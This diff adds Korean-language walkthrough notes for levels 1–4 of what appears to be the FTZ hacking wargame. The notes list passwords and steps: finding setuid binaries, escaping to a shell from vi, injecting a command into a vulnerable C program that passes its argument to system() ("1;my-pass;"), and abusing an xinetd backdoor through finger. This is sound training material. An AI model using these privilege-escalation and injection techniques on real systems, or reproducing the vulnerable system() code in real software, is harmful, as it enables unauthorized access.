@@ -166,3 +166,83 @@ password : best!
 >level1
 
 password : level1
+
+hint : level2 권한에 setuid가 걸린 파일을 찾는다.
+
+* 풀이
+    1. find / -user level2 -perm -4000
+    2. /bin/Execute 실행
+    3. /bin/bash 실행 
+    4. my-pass
+
+>level2
+
+password : hacker or cracker
+
+hint : 텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데...
+
+* 풀이 
+    1. find / -user level3 -perm -4000
+    2. /usr/bin/editor 실행 : vi editor 실행
+    3. vi 에디터에서 외부 명령어 실행
+    4. :! my-pass
+
+>level3
+
+password : can you fly?
+
+hint : 
+다음 코드는 autodig의 소스이다.
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+ 
+int main(int argc, char **argv){
+ 
+    char cmd[100];
+ 
+    if( argc!=2 ){
+        printf( "Auto Digger Version 0.9\n" );
+        printf( "Usage : %s host\n", argv[0] );
+        exit(0);
+    }
+ 
+    strcpy( cmd, "dig @" );
+    strcat( cmd, argv[1] );
+    strcat( cmd, " version.bind chaos txt");
+ 
+    system( cmd );
+ 
+}
+
+이를 이용하여 level4의 권한을 얻어라.
+
+more hints.
+- 동시에 여러 명령어를 사용하려면?
+- 문자열 형태로 명령어를 전달하려면?
+
+* 풀이
+    1. find / -name autodig
+    2. /bin/autodig "1;my-pass;"
+
+>level4
+
+password : suck my brain
+
+hint : 누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!
+
+* 풀이 
+    1. cat /etc/xinetd.d/backdoor
+    2. cat > /home/level4/tmp/backdoor.c
+    3. gcc -o backdoor backdoor.c
+    4. finger @localhost
+
+### backkdoor.c
+~~~ c
+#include <stdio.h>
+
+int main(){
+    system("my-pass");
+}
+~~~
